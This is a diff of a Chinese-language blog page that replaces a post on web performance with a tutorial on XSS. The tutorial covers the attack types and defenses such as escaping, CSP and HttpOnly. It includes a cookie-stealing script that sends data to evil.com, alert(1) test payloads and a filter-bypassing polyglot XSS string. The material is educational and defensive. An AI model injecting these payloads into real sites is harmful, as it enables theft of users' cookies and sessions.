@@ -21,22 +21,23 @@
   <meta name="author" content="Keven">
   <meta name="keywords" content="">
   
-    <meta name="description" content="参考：https:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;6981673766178783262https:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;6892994632968306702https:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;7326268947069534234 概念原因为了提高网页的加载速度和响应速度，给用户带来更好的体验和用户满意度，同时还能减少服务器的负载压力，以此来提升程序的稳定性，具体有以下">
+    <meta name="description" content="参考：https:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;6844903685122703367https:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;6844903638532358151 概念Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站当中注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可以获取用户的敏感信息如 Cookie、s">
 <meta property="og:type" content="article">
-<meta property="og:title" content="性能优化">
-<meta property="og:url" content="https://xuekeven.github.io/2025/08/07/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/index.html">
+<meta property="og:title" content="XSS攻击">
+<meta property="og:url" content="https://xuekeven.github.io/2025/08/07/XSS%E6%94%BB%E5%87%BB/index.html">
 <meta property="og:site_name" content="Keven&#39;s Blog">
-<meta property="og:description" content="参考：https:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;6981673766178783262https:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;6892994632968306702https:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;7326268947069534234 概念原因为了提高网页的加载速度和响应速度，给用户带来更好的体验和用户满意度，同时还能减少服务器的负载压力，以此来提升程序的稳定性，具体有以下">
+<meta property="og:description" content="参考：https:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;6844903685122703367https:&#x2F;&#x2F;juejin.cn&#x2F;post&#x2F;6844903638532358151 概念Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站当中注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可以获取用户的敏感信息如 Cookie、s">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-08-07T12:00:00.000Z">
-<meta property="article:modified_time" content="2025-08-13T10:28:29.650Z">
+<meta property="article:modified_time" content="2025-08-13T12:47:05.612Z">
 <meta property="article:author" content="Keven">
-<meta property="article:tag" content="性能优化">
+<meta property="article:tag" content="浏览器">
+<meta property="article:tag" content="网络安全">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>性能优化 - Keven&#39;s Blog</title>
+  <title>XSS攻击 - Keven&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -238,7 +239,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="性能优化"></span>
+            <span id="subtitle" data-typed-text="XSS攻击"></span>
           
         </div>
 
@@ -266,7 +267,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.5k 字
+          2.6k 字
         
       </span>
     
@@ -277,7 +278,7 @@
         
         
         
-          10 分钟
+          17 分钟
         
       </span>
     
@@ -322,17 +323,17 @@
     
     <div class="category row nomargin-x">
       <a class="category-item 
-          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="性能优化"
-        id="heading-c2f42bd2a149bbeb4627b1e1b5fabedb" role="tab" data-toggle="collapse" href="#collapse-c2f42bd2a149bbeb4627b1e1b5fabedb"
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="网络安全"
+        id="heading-a9fbbd40048656862e149a84b77b9b40" role="tab" data-toggle="collapse" href="#collapse-a9fbbd40048656862e149a84b77b9b40"
         aria-expanded="true"
       >
-        性能优化
-        <span class="list-group-count">(1)</span>
+        网络安全
+        <span class="list-group-count">(2)</span>
         <i class="iconfont icon-arrowright"></i>
       </a>
       
-      <div class="category-collapse collapse show" id="collapse-c2f42bd2a149bbeb4627b1e1b5fabedb"
-           role="tabpanel" aria-labelledby="heading-c2f42bd2a149bbeb4627b1e1b5fabedb">
+      <div class="category-collapse collapse show" id="collapse-a9fbbd40048656862e149a84b77b9b40"
+           role="tabpanel" aria-labelledby="heading-a9fbbd40048656862e149a84b77b9b40">
         
         
           
@@ -341,10 +342,19 @@
     
       
       
-        <a href="/2025/08/07/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/" title="性能优化"
+        <a href="/2025/08/11/CSRF%E6%94%BB%E5%87%BB/" title="CSRF攻击"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSRF攻击</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/08/07/XSS%E6%94%BB%E5%87%BB/" title="XSS攻击"
            class="list-group-item list-group-item-action
            active">
-          <span class="category-post">性能优化</span>
+          <span class="category-post">XSS攻击</span>
         </a>
       
     
@@ -366,7 +376,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">性能优化</h1>
+            <h1 id="seo-header">XSS攻击</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
@@ -379,213 +389,173 @@
             
               <div class="markdown-body">
                 
-                <p>参考：<br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6981673766178783262">https://juejin.cn/post/6981673766178783262</a><br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6892994632968306702">https://juejin.cn/post/6892994632968306702</a><br><a target="_blank" rel="noopener" href="https://juejin.cn/post/7326268947069534234">https://juejin.cn/post/7326268947069534234</a></p>
-<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>为了提高网页的加载速度和响应速度，给用户带来更好的体验和用户满意度，同时还能减少服务器的负载压力，以此来提升程序的稳定性，具体有以下几个因素：</p>
+                <p>参考：<br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903685122703367">https://juejin.cn/post/6844903685122703367</a><br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903638532358151">https://juejin.cn/post/6844903638532358151</a></p>
+<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站当中注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可以获取用户的敏感信息如 Cookie、sessionID 等内容，进而危害数据安全。</p>
+<p>为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。XSS 的本质是恶意代码未经过滤，与网站正常的代码混在一起，浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。</p>
+<p>在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行来完成比较复杂的攻击策略。不仅是业务上用户生产的内容可以进行注入，包括 URL 上参数等都可以是攻击的来源。因此在处理输入时，以下内容都不可信：</p>
 <ul>
-<li>提高用户体验</li>
-<li>提高用户留存率</li>
-<li>提高搜索引擎排名</li>
-<li>增加页面访问量</li>
-<li>减少服务器压力</li>
-<li>节约成本</li>
+<li>来自用户生成的内容（UGC）</li>
+<li>来自第三方的链接</li>
+<li>URL 参数</li>
+<li>POST 参数</li>
+<li>Referer（可能来自不可信的来源）</li>
+<li>Cookie（可能来自其他子域注入）</li>
 </ul>
-<h2 id="LCP"><a href="#LCP" class="headerlink" title="LCP"></a>LCP</h2><p>LCP（Largest Contentful Paint，<strong>最大内容渲染时间</strong>）</p>
+<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p>根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。</p>
+<table>
+<thead>
+<tr>
+<th align="center">分类</th>
+<th align="center">存储区*</th>
+<th align="center">插入点*</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">存储型</td>
+<td align="center">服务器存储</td>
+<td align="center">HTML</td>
+</tr>
+<tr>
+<td align="center">反射型</td>
+<td align="center">URL</td>
+<td align="center">HTML</td>
+</tr>
+<tr>
+<td align="center">DOM 型</td>
+<td align="center">浏览器内存</td>
+<td align="center">前端 JavaScript</td>
+</tr>
+</tbody></table>
 <ul>
-<li>含义：测量视口中最大文本或图片元素完成渲染的时间（例如首屏横幅图或标题）</li>
-<li>理想值：≤ 2.5 秒（超过 4 秒为“差”）</li>
-<li>影响因素：<ul>
-<li>服务器响应慢（TTFB 高）</li>
-<li>渲染阻塞的 JS/CSS 文件</li>
-<li>未优化的图片/视频资源</li>
+<li>存储区：恶意代码存放的位置</li>
+<li>插入点：由谁取得恶意代码并插入到网页上</li>
+</ul>
+<h2 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h2><ul>
+<li>原理：攻击者将恶意脚本存储到服务器数据库、文件或其他持久化介质，其他用户访问相关页面会自动执行恶意脚本</li>
+<li>触发条件：受害者访问了被注入脚本的页面</li>
+<li>特点：<ul>
+<li>危害大，影响持久</li>
+<li>可影响所有访问该数据的用户</li>
 </ul>
 </li>
-<li>优化方向：<ul>
-<li>预加载关键图片：<code>&lt;link rel=&quot;preload&quot; as=&quot;image&quot; href=&quot;banner.jpg&quot;&gt;</code></li>
-<li>开启 HTTP/2 或 CDN 加速资源传输</li>
-<li>服务端渲染（SSR）减少客户端渲染延迟</li>
+<li>场景：常见于带有用户保存数据的网站功能，如论坛发帖、评论、用户私信、个人简介等</li>
+<li>例子：比如提交 <code>&lt;script&gt;fetch(&#39;https://evil.com?cookie=&#39;+document.cookie)&lt;/script&gt;</code> 到评论区，其他用户浏览评论时中招</li>
+</ul>
+<h2 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h2><ul>
+<li>原理：攻击者把恶意脚本通过 URL 参数等立即“反射”到页面响应中执行</li>
+<li>触发条件：受害者点击带恶意参数的链接，服务端未进行输出转义，直接拼到 HTML 返回。由于需要用户主动打开恶意的 URL 才能攻击，攻击者往往会结合多种手段诱导用户点击。POST 方法也可以触发反射型 XSS，但是触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见</li>
+<li>特点：<ul>
+<li>不会长期存储在服务器</li>
+<li>依赖用户点击或请求</li>
 </ul>
 </li>
+<li>场景：常见于通过 URL 传递参数的功能，如网站搜索、跳转等</li>
+<li>例子：比如构造 <code>https://example.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code> 样式的 URL，如果服务器直接将 q 输出到 HTML 中，就会执行弹窗</li>
 </ul>
-<h2 id="FCP"><a href="#FCP" class="headerlink" title="FCP"></a>FCP</h2><p>FCP（First Contentful Paint，<strong>首次内容绘制时间</strong>）</p>
+<p>反射型 XSS 跟存储型 XSS 的区别在于，存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</p>
+<h2 id="DOM-based-XSS"><a href="#DOM-based-XSS" class="headerlink" title="DOM-based XSS"></a>DOM-based XSS</h2><ul>
+<li>原理：前端 JavaScript 代码有漏洞，浏览器在处理 DOM 时直接把用户输入拼接到可执行位置，导致执行恶意脚本</li>
+<li>触发条件：无需经过服务器拼接 HTML，纯前端脚本操作引发</li>
+<li>特点：<ul>
+<li>漏洞点在前端 JavaScript 代码</li>
+<li>数据流：用户输入 → 前端 JS → DOM API → 执行</li>
+</ul>
+</li>
+<li>场景：常见于需要用户输入的页面</li>
+<li>例子：在 <code>https://example.com/#&lt;script&gt;alert(1)&lt;/script&gt;</code> 网站执行<code>document.body.innerHTML = location.hash.substring(1);</code></li>
+</ul>
+<p>DOM 型 XSS 跟另外两种 XSS 的区别在于，DOM 型 XSS 攻击中取出和执行恶意代码由浏览器完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p>
+<h1 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h1><p>XSS 攻击有两大要素必不可少：</p>
 <ul>
-<li>含义：记录浏览器首次渲染任何内容的时间（如文字、图片），标志着用户感知到页面开始加载</li>
-<li>理想值：≤ 1.8 秒（超过 3 秒为“差”）</li>
-<li>与 LCP 区别：FCP 关注“首次开始渲染”，LCP 关注“最大内容渲染完成”</li>
-<li>优化方向：<ul>
-<li>内联关键 CSS（Critical CSS）</li>
-<li>异步加载非阻塞 JS（async/defer）</li>
-<li>减少首屏 DOM 复杂度</li>
+<li>攻击者提交恶意代码</li>
+<li>浏览器执行恶意代码</li>
 </ul>
-</li>
-</ul>
-<h2 id="FID"><a href="#FID" class="headerlink" title="FID"></a>FID</h2><p>FID（First Input Delay，<strong>首次输入延迟</strong>）</p>
+<h2 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h2><p>在用户提交时，由前端过滤输入，然后提交到后端。这样做不可行，因为一旦攻击者绕过前端过滤，改为直接构造请求就可以提交恶意代码。</p>
+<p>后端在写入数据库前对输入进行过滤，然后把“安全的”内容返回给前端，这样做不完全可行。比如，正常输入了 <code>5 &lt; 7</code> 这个内容，在写入数据库前被转义变成了 <code>5 &amp;lt; 7</code>。但问题是，并不确定内容要输出到哪里：</p>
 <ul>
-<li>含义：测量用户首次交互（点击按钮、输入文本）到浏览器实际响应的时间，反映页面可交互性</li>
-<li>理想值：≤ 100 毫秒（超过 300 毫秒为“差”）</li>
-<li>根本原因：主线程被长任务（Long Tasks &gt;50ms）阻塞（如解析大 JS 文件）</li>
-<li>优化方向：<ul>
-<li>拆分长任务：用 requestIdleCallback 分片执行</li>
-<li>优化第三方脚本（广告、分析工具）</li>
-<li>使用 Web Workers 处理计算任务</li>
+<li>用户的输入内容可能同时提供给前端和客户端，如果没有进行反转客户端显示内容就变成了乱码</li>
+<li>在前端中，不同的位置所需要的编码也不同<ul>
+<li>当 <code>5 &amp;lt; 7</code> 作为 HTML 拼接页面时可以正常显示</li>
+<li>当 <code>5 &amp;lt; 7</code> 通过 Ajax 值返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算</li>
 </ul>
 </li>
 </ul>
-<h2 id="CLS"><a href="#CLS" class="headerlink" title="CLS"></a>CLS</h2><p>CLS（Cumulative Layout Shift，<strong>累积布局偏移</strong>）</p>
+<p>所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但是会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等内容，进行输入过滤还是必要的。</p>
+<p>既然输入过滤并非完全可靠，就要通过“防止浏览器执行恶意代码”来防范 XSS 攻击，可分为两类：</p>
 <ul>
-<li>含义：量化页面意外布局移动的严重程度（例如图片加载后挤压下方内容）</li>
-<li>计算方式：CLS = 影响比例 × 位移距离（视口高度占比）</li>
-<li>理想值：≤ 0.1（超过 0.25 为“差”）</li>
-<li>常见场景：<ul>
-<li>未设置尺寸的图片/广告位</li>
-<li>动态插入的页面元素（如弹窗）</li>
-<li>异步加载的字体 37。</li>
+<li>防止 HTML 中出现注入</li>
+<li>防止 JavaScript 执行时执行恶意代码</li>
 </ul>
-</li>
-<li>优化方向：<ul>
-<li>为媒体元素设置宽高：<code>&lt;img width=&quot;600&quot; height=&quot;400&quot; src=&quot;...&quot;&gt;</code></li>
-<li>预留动态内容占位区域</li>
-<li>使用 <code>transform: scale()</code> 替代改变布局的属性</li>
-</ul>
-</li>
-</ul>
-<h1 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h1><p>从<strong>优化目标</strong>、<strong>优化策略</strong>两个方面来考虑，还可以了解一下<a target="_blank" rel="noopener" href="https://juejin.cn/post/6981673766178783262#heading-13">六大指标</a>。</p>
-<h2 id="优化目标"><a href="#优化目标" class="headerlink" title="优化目标"></a>优化目标</h2><p>分为<strong>时间层面</strong>和<strong>体积层面</strong>。</p>
-<h3 id="加载性能"><a href="#加载性能" class="headerlink" title="加载性能"></a>加载性能</h3><ul>
-<li>目标：LCP ≤2.5s（首屏内容渲染）、FCP ≤1.8s（首次内容绘制）</li>
-<li>策略：资源压缩、CDN 分发、预加载关键资源</li>
-</ul>
-<h3 id="交互体验"><a href="#交互体验" class="headerlink" title="交互体验"></a>交互体验</h3><ul>
-<li>目标：FID ≤100ms（输入响应）、CLS ≤0.1（布局稳定性）</li>
-<li>策略：拆分长任务、避免强制同步布局、使用 will-change 触发 GPU 加速</li>
-</ul>
-<h3 id="资源效率"><a href="#资源效率" class="headerlink" title="资源效率"></a>资源效率</h3><ul>
-<li>目标：JS &lt;200KB（首屏）、CSS &lt;100KB、图片体积减少 25%-50%</li>
-<li>策略：Tree Shaking、图片转 WebP/AVIF、字体子集化</li>
-</ul>
-<h2 id="优化策略"><a href="#优化策略" class="headerlink" title="优化策略"></a>优化策略</h2><p>分为<strong>网络传输</strong>、<strong>页面解析渲染</strong>、<strong>运行时性能</strong>。</p>
-<h3 id="网络传输"><a href="#网络传输" class="headerlink" title="网络传输"></a>网络传输</h3><ul>
-<li><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6981673766178783262#heading-3">构建策略</a></p>
+<h2 id="预防存储型和反射型"><a href="#预防存储型和反射型" class="headerlink" title="预防存储型和反射型"></a>预防存储型和反射型</h2><p>存储型和反射型 XSS 攻击都是在服务端取出恶意代码后插入到响应 HTML，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。预防这种漏洞，有两种常见做法：</p>
 <ul>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6892994632968306702#heading-0">合并小文件，减少 HTTP 请求</a></li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6892994632968306702#heading-17">使用 GZIP 压缩静态文件（HTML/CSS/JS/图片）</a></li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/7381739621338857523">JS Tree Shaking</a></li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/7040792659153125413">CSS Tree Shaking</a></li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6892994632968306702#heading-25">按需加载（懒加载）</a></li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/7326268947069534234#heading-13">择优选择三方库依赖</a></li>
+<li>改成纯前端渲染，把代码和数据分隔开</li>
+<li>对 HTML 做充分转义</li>
 </ul>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6892994632968306702#heading-18">图片优化</a>/<a target="_blank" rel="noopener" href="https://juejin.cn/post/6981673766178783262#heading-4">图像策略</a></p>
+<h3 id="纯前端渲染"><a href="#纯前端渲染" class="headerlink" title="纯前端渲染"></a>纯前端渲染</h3><p>纯前端渲染的过程：</p>
 <ul>
-<li>用 CSS 代替图片</li>
-<li>图片延迟加载</li>
-<li>响应式图片</li>
-<li>调整图片大小</li>
-<li>降低图片质量</li>
-<li>使用 webp 格式</li>
+<li>浏览器先加载一个静态 HTML 文件，此 HTML 不包含任何跟业务相关的数据</li>
+<li>然后浏览器执行 HTML 中的 JavaScript</li>
+<li>JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上</li>
 </ul>
-</li>
-<li><p>请求策略</p>
+<p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码。但是纯前端渲染还需注意避免 DOM 型 XSS 漏洞。</p>
+<p>在很多内部管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高或者有 SEO 需求的页面，仍然要面对拼接 HTML 的问题。</p>
+<h3 id="转义-HTML"><a href="#转义-HTML" class="headerlink" title="转义 HTML"></a>转义 HTML</h3><p>如果拼接 HTML 是必要的，就需要采用合适的转义库来对 HTML 模板各处插入点进行充分的转义。</p>
+<p>常用的模板引擎，比如 doT.js、ejs、FreeMarker 等等，对于 HTML 转义通常只有一个规则，就是把 <code>&amp; &lt; &gt; &quot; &#39; /</code> 这几个字符转义掉，虽然能起到一定的 XSS 防护作用，但并不完善：</p>
+<table>
+<thead>
+<tr>
+<th align="center">XSS 安全漏洞</th>
+<th align="center">简单转义是否有防护作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">HTML 标签文字内容</td>
+<td align="center">有</td>
+</tr>
+<tr>
+<td align="center">HTML 属性值</td>
+<td align="center">有</td>
+</tr>
+<tr>
+<td align="center">CSS 内联样式</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">内联 JavaScript</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">内联 JSON</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">跳转链接</td>
+<td align="center">无</td>
+</tr>
+</tbody></table>
+<p>要完善 XSS 防护措施，要使用更完善更细致的转义策略。而且 HTML 编码是十分复杂的，在不同的上下文要使用相应的转义规则。</p>
+<h2 id="预防-DOM-型"><a href="#预防-DOM-型" class="headerlink" title="预防 DOM 型"></a>预防 DOM 型</h2><p>DOM 型 XSS 攻击，实际上就是前端 JavaScript 代码本身不严谨，把不可信的数据当作代码执行了。</p>
+<p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等属性。如果用 Vue/React 技术栈，尽量不用 <code>v-html</code>/<code>dangerouslySetInnerHTML</code> 等，在前端 render 阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 XSS 隐患。</p>
+<p>DOM 中的内联事件监听器，比如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> ，<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 里的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code> 等函数，都能把字符串作为代码运行。如果把不可信的数据拼接到字符串中并传递给这些 API，就很容易产生安全隐患。</p>
+<h2 id="其他防范措施"><a href="#其他防范措施" class="headerlink" title="其他防范措施"></a>其他防范措施</h2><h3 id="严格-CSP"><a href="#严格-CSP" class="headerlink" title="严格 CSP"></a>严格 CSP</h3><p>严格的 CSP（Content Security Policy） 在 XSS 的防范中可以起到以下的作用：</p>
 <ul>
-<li>减少 Cookie 传输</li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6892994632968306702#heading-1">使用 HTTP2</a></li>
+<li>禁止加载外域代码，防止复杂的攻击逻辑。</li>
+<li>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</li>
+<li>禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。</li>
+<li>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。</li>
+<li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li>
 </ul>
-</li>
-<li><p>分发策略</p>
+<h3 id="控制输入内容长度"><a href="#控制输入内容长度" class="headerlink" title="控制输入内容长度"></a>控制输入内容长度</h3><p>对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。</p>
+<h3 id="Cookie-HttpOnly"><a href="#Cookie-HttpOnly" class="headerlink" title="Cookie HttpOnly"></a>Cookie HttpOnly</h3><p>设置 Cookie 时使用 <code>HttpOnly</code> 属性，禁止 JavaScript 读取敏感 Cookie，攻击者完成 XSS 注入后也无法窃取 Cookie。</p>
+<h1 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h1><p>有两种方法检测 XSS 漏洞：</p>
 <ul>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6892994632968306702#heading-11">静态资源使用 CDN</a></li>
-</ul>
+<li><p>使用通用 XSS 攻击字符串手动检测 XSS 漏洞</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">jaVasCript:<span class="hljs-comment">/*-/*`/*\`/*&#x27;/*&quot;/**/</span>(<span class="hljs-comment">/* */</span>oNcliCk=alert() )<span class="hljs-regexp">//%0D%0A%0d%0a//</span>&lt;<span class="hljs-regexp">/stYle/</span>&lt;<span class="hljs-regexp">/titLe/</span>&lt;<span class="hljs-regexp">/teXtarEa/</span>&lt;<span class="hljs-regexp">/scRipt/</span>--!&gt;<span class="hljs-string">\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</span><br></code></pre></td></tr></table></figure>
+
+<p>上面的字符串能够检测到存在于 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等多种上下文 XSS 漏洞，也包括 eval()、setTimeout()、setInterval()、Function()、innerHTML、document.write() 等 DOM 型 XSS 漏洞，并且能绕过一些 XSS 过滤器。</p>
 </li>
-<li><p>缓存策略</p>
-<ul>
-<li><a href="/2021/08/20/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E9%9D%A2%E8%AF%95%E9%A2%98/#%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6">使用 HTTP 缓存</a></li>
-</ul>
+<li><p>使用扫描工具自动检测 XSS 漏洞<br>如 Arachni、Mozilla HTTP Observatory、w3af 等工具。</p>
 </li>
-</ul>
-<h3 id="页面解析渲染"><a href="#页面解析渲染" class="headerlink" title="页面解析渲染"></a>页面解析渲染</h3><ul>
-<li><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6981673766178783262#heading-9">DOM 策略</a></p>
-<ul>
-<li>尽量减少 DOM 数量</li>
-<li>缓存 DOM 计算属性</li>
-<li>避免过多 DOM 操作</li>
-<li>使用 DOMFragment 缓存批量化 DOM 操作</li>
-</ul>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6981673766178783262#heading-8">CSS 策略</a></p>
-<ul>
-<li>避免为 ID 选择器添加多余选择器</li>
-<li>避免使用标签选择器代替类选择器</li>
-<li>避免使用通配选择器，只对目标节点声明规则</li>
-<li>避免重复匹配重复定义，关注可继承属性</li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6892994632968306702#heading-43">尽量降低 CSS 选择器复杂度</a></li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/7333066398175903781">尽量用<code>link</code>少用<code>@import</code></a></li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/7326268947069534234#heading-9">尽量用 CSS 实现动画</a></li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6892994632968306702#heading-47">使用 <code>transform</code> 和 <code>opacity</code> 实现动画</a></li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6892994632968306702#heading-46">使用弹性布局</a></li>
-</ul>
-</li>
-<li><p>阻塞策略</p>
-<ul>
-<li>使用骨架屏</li>
-<li>静态生成首屏文件</li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6892994632968306702#heading-8">使用服务端渲染（SSR）</a></li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903815758479374#heading-15">尽量减少 JS 操作 DOM 和 CSSOM</a></li>
-<li><a href="/2021/09/12/%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E6%B8%B2%E6%9F%93/#%E4%B8%BA%E4%BB%80%E4%B9%88-JS-%E6%96%87%E4%BB%B6%E4%BC%9A%E9%98%BB%E5%A1%9E%E9%A1%B5%E9%9D%A2%E6%B8%B2%E6%9F%93">CSS 文件放在头部，JS 文件放在底部或使用 <code>defer/async</code></a></li>
-</ul>
-</li>
-<li><p>回流重绘策略</p>
-<ul>
-<li><a href="/2021/09/12/%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E6%B8%B2%E6%9F%93/#%E5%B8%83%E5%B1%80-Render-Tree%EF%BC%88%E5%9B%9E%E6%B5%81%EF%BC%89">减少使用会导致回流的属性和方法</a></li>
-<li><a href="/2021/09/12/%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E6%B8%B2%E6%9F%93/#%E7%BB%98%E5%88%B6-Render-Tree%EF%BC%88%E9%87%8D%E7%BB%98%EF%BC%89">减少使用会导致重绘的属性和方法</a></li>
-</ul>
-</li>
-</ul>
-<h3 id="运行时性能"><a href="#运行时性能" class="headerlink" title="运行时性能"></a>运行时性能</h3><ul>
-<li><p>JavaScript 执行性能</p>
-<ul>
-<li>事件节流/防抖（<code>throttle / debounce</code>）</li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/7326268947069534234#heading-8">启用事件委托</a></li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6892994632968306702#heading-33">if-else 对比 switch</a></li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6892994632968306702#heading-38">使用位操作</a></li>
-<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6892994632968306702#heading-42">尽量使用原生方法，执行效率高</a></li>
-<li>虚拟列表（virtual scroll）</li>
-</ul>
-</li>
-<li><p>内存管理</p>
-<ul>
-<li>及时清理定时器和事件监听</li>
-<li>避免内存泄漏（闭包/DOM 引用未释放）</li>
-</ul>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6892994632968306702#heading-37">使用 Web Worker</a></p>
-<ul>
-<li>耗时计算放到 Worker 中，避免阻塞 UI</li>
-</ul>
-</li>
-<li><p>React</p>
-<ul>
-<li>使用 hook 添加依赖</li>
-<li>使用 memo 函数</li>
-</ul>
-</li>
-<li><p>Vue</p>
-<ul>
-<li>合理使用 watch 和 computed，数据变化就会执行，避免使用太多，减少不必要的开销</li>
